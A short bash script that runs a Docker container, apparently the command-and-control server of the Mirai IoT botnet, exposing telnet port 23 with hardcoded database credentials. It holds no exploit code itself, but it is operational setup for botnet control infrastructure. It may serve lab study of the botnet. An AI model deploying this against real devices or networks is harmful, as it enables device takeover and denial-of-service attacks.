#!/bin/bash

docker run --rm -it \
	-p 23:23 \
	-e DBHOST=127.0.0.1 \
	-e DBUSER=mirai \
	-e DBPASS=miraipass \
	-e DBNAME=mirai \
	srozb/mirai_cnc ./cnc
